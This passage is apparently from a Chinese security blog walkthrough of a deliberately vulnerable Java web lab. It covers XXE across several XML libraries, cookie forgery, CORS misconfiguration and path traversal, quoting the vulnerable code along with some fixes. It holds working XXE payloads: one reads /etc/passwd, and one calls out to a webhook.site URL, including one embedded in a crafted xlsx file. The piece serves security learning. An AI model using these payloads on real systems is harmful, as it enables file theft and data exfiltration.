        for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;
            Node rootNode = rootNodeList.item(i);
            NodeList xxe = rootNode.getChildNodes();
            for (int j = 0; j &lt; xxe.getLength(); j++) &#123;
                Node xxeNode = xxe.item(j);
                // 测试不能blind xxe，所以强行加了一个回显
                logger.info(&quot;xxeNode: &quot; + xxeNode.getNodeValue());
            &#125;

        &#125;
    &#125;
复制代码1234567891011121314151617181920212223242526
</code></pre>
<p>修复该漏洞只需升级 dom4j 到 2.1.1 及以上，该版本及以上禁用了 ENTITY，不带 ENTITY 的 PoC 不能利用，所以禁用 ENTITY 即可完成修复。</p>
<h3 id="上述存在xxe漏洞库对比"><a class="anchor" href="#上述存在xxe漏洞库对比">#</a> 上述存在 XXE 漏洞库对比</h3>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>工具 / 类</strong></th>
<th style="text-align:left"><strong>简介</strong></th>
<th style="text-align:left"><strong>使用场景</strong></th>
<th style="text-align:left"><strong>优点</strong></th>
<th style="text-align:left"><strong>缺点</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>xmlReader</code></td>
<td style="text-align:left">SAX 的接口，基于事件驱动的解析</td>
<td style="text-align:left">处理大型 XML 文件</td>
<td style="text-align:left">内存占用小，速度快</td>
<td style="text-align:left">需要手动管理上下文，处理复杂结构困</td>
</tr>
<tr>
<td style="text-align:left"><code>SAXBuilder</code></td>
<td style="text-align:left">JDOM 中基于 SAX 的解析器</td>
<td style="text-align:left">需要用 JDOM 处理 XML 数据时</td>
<td style="text-align:left">结合了 SAX 的高效性和 JDOM 的易用性</td>
<td style="text-align:left">解析速度依赖于 SAX，灵活性低于 DOM</td>
</tr>
<tr>
<td style="text-align:left">SAXReader`       | Dom4j 中基于 SAX 的解析器                                | 需要 Dom4j 进行 XML 操作时                    | 高效且灵活，支持树结构              | 性能略逊于纯 SAX                     |</td>
</tr>
<tr>
<td style="text-align:left"><code>SAXParser</code></td>
<td style="text-align:left">Java 中的 SAX 解析器</td>
<td style="text-align:left">基于事件驱动的解析，适合处理大型 XML 文件</td>
<td style="text-align:left">高效，内存占用小</td>
<td style="text-align:left">解析复杂 XML 需要手动处理回调</td>
</tr>
<tr>
<td style="text-align:left">Digester`        | 基于 SAX，将 XML 映射到 Java 对象（Apache Commons 提供） | 需要将 XML 映射为 Java 对象时                 | 简化 XML 与 Java 对象的映射         | 对大文件不友好，灵活性较低           |</td>
</tr>
<tr>
<td style="text-align:left">DocumentBuilder` | Java 中 DOM 解析器，用于构建树状结构                     | 需要完整树结构操作，如修改和多次遍历 XML 文件 | 完整保留文档结构，易于查找和修改    | 内存占用较大，处理大文件时性能较差   |</td>
</tr>
<tr>
<td style="text-align:left"><code>DocumentHelper</code></td>
<td style="text-align:left">Dom4j 提供的辅助类，用于快速创建和操作 XML 文档</td>
<td style="text-align:left">需要手动构建和操作 XML 文档时</td>
<td style="text-align:left">快速创建和处理 XML 文档，灵活性高</td>
<td style="text-align:left">内存占用较大，处理超大文件时性能不佳</td>
</tr>
</tbody>
</table>
<h4 id="统一漏洞利用payload"><a class="anchor" href="#统一漏洞利用payload">#</a> 统一漏洞利用 payload：</h4>
<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "	https://webhook.site/9181b45a-e69a-4ca5-8424-f3f6888ddf8e"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><h4 id="统一修复代码"><a class="anchor" href="#统一修复代码">#</a> 统一修复代码：</h4>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 实例化解析类之后通常会支持着三个配置</span></pre></td></tr><tr><td data-num="2"></td><td><pre>obj<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://apache.org/xml/features/disallow-doctype-decl"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>obj<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://xml.org/sax/features/external-general-entities"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>obj<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://xml.org/sax/features/external-parameter-entities"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>仅用了外部实体，限制实体来源</p>
<h3 id="10路由xxexmlbeamvuln"><a class="anchor" href="#10路由xxexmlbeamvuln">#</a> 10. 路由 /xxe/xmlbeam/vuln</h3>
<p>漏洞源码：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/xmlbeam/vuln"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token class-name">HttpEntity</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token function">post</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">UserPayload</span> user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>                logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>                <span class="token keyword">return</span> <span class="token class-name">ResponseEntity</span><span class="token punctuation">.</span><span class="token function">ok</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"hello, %s!"</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getUserName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>                <span class="token keyword">return</span> <span class="token class-name">ResponseEntity</span><span class="token punctuation">.</span><span class="token function">ok</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token comment">/**</pre></td></tr><tr><td data-num="13"></td><td><pre>         * The projection interface using XPath and JSON Path expression to selectively pick elements from the payload.</pre></td></tr><tr><td data-num="14"></td><td><pre>         */</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token annotation punctuation">@ProjectedPayload</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserPayload</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            <span class="token annotation punctuation">@XBRead</span><span class="token punctuation">(</span><span class="token string">"//userName"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token class-name">String</span> <span class="token function">getUserName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>该代码需要使用固定的标签实现回显，我们可以构造 payload</p>
<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset">  </pre></td></tr><tr><td data-num="3"></td><td><pre>    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd">  </pre></td></tr><tr><td data-num="4"></td><td><pre></span><span class="token punctuation">]</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>userPayload</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>userName</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>userName</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>userPayload</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507211100097.png" alt="image-20250721110045191" /></p>
<h3 id="路由ooxmlreadxlsx"><a class="anchor" href="#路由ooxmlreadxlsx">#</a> 路由 /ooxml/readxlsx</h3>
<p>漏洞源码：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/readxlsx"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token annotation punctuation">@ResponseBody</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">ooxml_xxe</span><span class="token punctuation">(</span><span class="token class-name">MultipartFile</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token class-name">XSSFWorkbook</span> wb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XSSFWorkbook</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// xxe vuln</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token class-name">XSSFSheet</span> sheet <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">getSheetAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token class-name">XSSFRow</span> row<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token class-name">XSSFCell</span> cell<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token class-name">Iterator</span> rows <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">rowIterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token class-name">StringBuilder</span> sbResult <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">while</span> <span class="token punctuation">(</span>rows<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>            row <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">XSSFRow</span><span class="token punctuation">)</span> rows<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            <span class="token class-name">Iterator</span> cells <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">cellIterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token keyword">while</span> <span class="token punctuation">(</span>cells<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>                cell <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">XSSFCell</span><span class="token punctuation">)</span> cells<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span>cell<span class="token punctuation">.</span><span class="token function">getCellType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">XSSFCell</span><span class="token punctuation">.</span><span class="token constant">CELL_TYPE_STRING</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                    sbResult<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>cell<span class="token punctuation">.</span><span class="token function">getStringCellValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cell<span class="token punctuation">.</span><span class="token function">getCellType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">XSSFCell</span><span class="token punctuation">.</span><span class="token constant">CELL_TYPE_NUMERIC</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                    sbResult<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>cell<span class="token punctuation">.</span><span class="token function">getNumericCellValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>                    logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"errors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token keyword">return</span> sbResult<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>查看源码得知使用的是 poi-ooxml 组件（Apache POI 是提供 Microsoft Office 系列文档读写功能的 JAVA 类库）</p>
<p>进行 Xlsx 文件操作，在 3.10 版本及以下存在 XXE 注入漏洞，3.15 以下版本存在 Dos 漏洞，这里使用的是 3.10 版本。</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507211105199.png" alt="image-20250721110504083" /></p>
<p>可以在 windows 新建一个 xlsx 文件，然后改成 zip 文件，进行解压，有一个 content-type.xml 文件，修改里面的文件</p>
<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "	https://webhook.site/9181b45a-e69a-4ca5-8424-f3f6888ddf8e"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507221635389.png" alt="image-20250722163502627" /></p>
<p>类似于这样的：</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507221635185.png" alt="image-20250722163559085" /></p>
<p>但是我只能访问 http 网站，不能加载外部 dtd 文件来外带数据，不过还是可以证明我的操作是没错的</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507221637836.png" alt="image-20250722163704731" /></p>
<h3 id="12路由xlsx-streamerreadxlsx"><a class="anchor" href="#12路由xlsx-streamerreadxlsx">#</a> 12. 路由 /xlsx-streamer/readxlsx</h3>
<p>漏洞代码：</p>
<pre><code> @PostMapping(&quot;/readxlsx&quot;)
    public void xllx_streamer_xxe(MultipartFile file) throws IOException &#123;
        StreamingReader.builder().open(file.getInputStream());
    &#125;
java复制代码1234
</code></pre>
<p>换了个库，原理 payload 同上</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507221637176.png" alt="image-20250722163757999" /></p>
<h2 id="cookie伪造"><a class="anchor" href="#cookie伪造">#</a> cookie 伪造</h2>
<h3 id="1路由cookievuln01"><a class="anchor" href="#1路由cookievuln01">#</a> 1. 路由 /cookie/vuln01</h3>
<p>漏洞代码：</p>
<pre><code>    private static String NICK = &quot;nick&quot;;

    @GetMapping(value = &quot;/vuln01&quot;)
    public String vuln01(HttpServletRequest req) &#123;
        String nick = WebUtils.getCookieValueByName(req, NICK); // key code
        return &quot;Cookie nick: &quot; + nick;
    &#125;
java复制代码1234567
</code></pre>
<h3 id="2路由cookievuln02"><a class="anchor" href="#2路由cookievuln02">#</a> 2. 路由 /cookie/vuln02</h3>
<p>漏洞代码：</p>
<pre><code> @GetMapping(value = &quot;/vuln02&quot;)
    public String vuln02(HttpServletRequest req) &#123;
        String nick = null;
        Cookie[] cookie = req.getCookies();

        if (cookie != null) &#123;
            nick = getCookie(req, NICK).getValue();  // key code
        &#125;

        return &quot;Cookie nick: &quot; + nick;
    &#125;
Java复制代码1234567891011
</code></pre>
<h3 id="3路由cookievuln03"><a class="anchor" href="#3路由cookievuln03">#</a> 3. 路由 /cookie/vuln03</h3>
<p>漏洞代码：</p>
<pre><code>   @GetMapping(value = &quot;/vuln03&quot;)
    public String vuln03(HttpServletRequest req) &#123;
        String nick = null;
        Cookie cookies[] = req.getCookies();
        if (cookies != null) &#123;
            for (Cookie cookie : cookies) &#123;
                // key code. Equals can also be equalsIgnoreCase.
                if (NICK.equals(cookie.getName())) &#123;
                    nick = cookie.getValue();
                &#125;
            &#125;
        &#125;
        return &quot;Cookie nick: &quot; + nick;
    &#125;
Java复制代码1234567891011121314
</code></pre>
<h3 id="4路由cookievuln04"><a class="anchor" href="#4路由cookievuln04">#</a> 4. 路由 /cookie/vuln04</h3>
<p>漏洞代码：</p>
<pre><code>@GetMapping(value = &quot;/vuln04&quot;)
    public String vuln04(HttpServletRequest req) &#123;
        String nick = null;
        Cookie cookies[] = req.getCookies();
        if (cookies != null) &#123;
            for (Cookie cookie : cookies) &#123;
                if (cookie.getName().equalsIgnoreCase(NICK)) &#123;  // key code
                    nick = cookie.getValue();
                &#125;
            &#125;
        &#125;
        return &quot;Cookie nick: &quot; + nick;
    &#125;
Java复制代码12345678910111213
</code></pre>
<h3 id="5路由cookievuln05"><a class="anchor" href="#5路由cookievuln05">#</a> 5. 路由 /cookie/vuln05</h3>
<p>漏洞代码：</p>
<pre><code>   @GetMapping(value = &quot;/vuln05&quot;)
    public String vuln05(@CookieValue(&quot;nick&quot;) String nick) &#123;
        return &quot;Cookie nick: &quot; + nick;
    &#125;
Java复制代码1234
</code></pre>
<h3 id="6路由cookievuln06"><a class="anchor" href="#6路由cookievuln06">#</a> 6. 路由 /cookie/vuln06</h3>
<p>漏洞代码:</p>
<pre><code>@GetMapping(value = &quot;/vuln06&quot;)
    public String vuln06(@CookieValue(value = &quot;nick&quot;) String nick) &#123;
        return &quot;Cookie nick: &quot; + nick;
    &#125;
复制代码1234
</code></pre>
<h3 id="漏洞利用"><a class="anchor" href="#漏洞利用">#</a> 漏洞利用</h3>
<p>我们可以直接通过修改 cookie 的值实现对 nick 值的修改，某些情况可能会存在越权漏洞，操作如下：</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507221648475.png" alt="image-20250722164822134" /></p>
<h2 id="cors"><a class="anchor" href="#cors">#</a> CORS</h2>
<p>CORS（跨域资源共享）是用来实现跨域资源访问的，<span class="exturl" data-url="aHR0cDovL3huLS1hMS14eDJjeWE5MzVqMGxjdjAxYm95aS54bi0tY29tYjEtdG45aC5jb20=">比如有两个域 a1.com 和 b1.com</span>，假设 b1.com 上面有个接口能够获取一些返回的数据，那么如果我们从 a1.com 写一段 js 去请求这个接口的数据，一般来说是请求不了的，会在浏览器爆出 CORS 错误，但如果有 CORS 设置，就可以实现这样的访问，甚至可以能够使用 b1.com 上的 cookie。</p>
<h3 id="1路由corsvulnorigin"><a class="anchor" href="#1路由corsvulnorigin">#</a> 1. 路由 /cors/vuln/origin</h3>
<p>漏洞代码：</p>
<pre><code>    private static String info = &quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;;

    @GetMapping(&quot;/vuln/origin&quot;)
    public String vuls1(HttpServletRequest request, HttpServletResponse response) &#123;
        String origin = request.getHeader(&quot;origin&quot;);
        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); // set origin from header
        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  // allow cookie
        return info;
    &#125;
java复制代码123456789
</code></pre>
<h3 id="2路由corsvulnsetheader"><a class="anchor" href="#2路由corsvulnsetheader">#</a> 2. 路由 /cors/vuln/setHeader</h3>
<p>漏洞代码：</p>
<pre><code>@GetMapping(&quot;/vuln/setHeader&quot;)
    public String vuls2(HttpServletResponse response) &#123;
        // 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常
        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);
        return info;
    &#125;
java复制代码123456
</code></pre>
<h3 id="3路由corsvulncrossorigin"><a class="anchor" href="#3路由corsvulncrossorigin">#</a> 3. 路由 /cors/vuln/crossOrigin</h3>
<p>漏洞代码：</p>
<pre><code>    @GetMapping(&quot;*&quot;)
    @RequestMapping(&quot;/vuln/crossOrigin&quot;)
    public String vuls3() &#123;
        return info;
    &#125;
Java复制代码12345
</code></pre>
<h3 id="漏洞验证"><a class="anchor" href="#漏洞验证">#</a> 漏洞验证</h3>
<p>可通过抓包修改 origin 字段验证漏洞</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507221720812.png" alt="image-20250722172007570" /></p>
<p>不为空时，验证白名单：</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507221720728.png" alt="image-20250722172034590" /></p>
<h2 id="目录遍历"><a class="anchor" href="#目录遍历">#</a> 目录遍历</h2>
<h3 id="路由path_traversalvul"><a class="anchor" href="#路由path_traversalvul">#</a> 路由 /path_traversal/vul</h3>
<h4 id="漏洞代码"><a class="anchor" href="#漏洞代码">#</a> 漏洞代码：</h4>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path_traversal/vul"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getImage</span><span class="token punctuation">(</span><span class="token class-name">String</span> filepath<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">return</span> <span class="token function">getImgBase64</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">getImgBase64</span><span class="token punctuation">(</span><span class="token class-name">String</span> imgFile<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Working directory: "</span> <span class="token operator">+</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"File path: "</span> <span class="token operator">+</span> imgFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token class-name">File</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>imgFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>f<span class="token punctuation">.</span><span class="token function">isDirectory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>imgFile<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeBase64</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            <span class="token keyword">return</span> <span class="token string">"File doesn't exist or is not a file."</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507241529787.png" alt="image-20250724152905575" /></p>
<p>修复代码：</p>
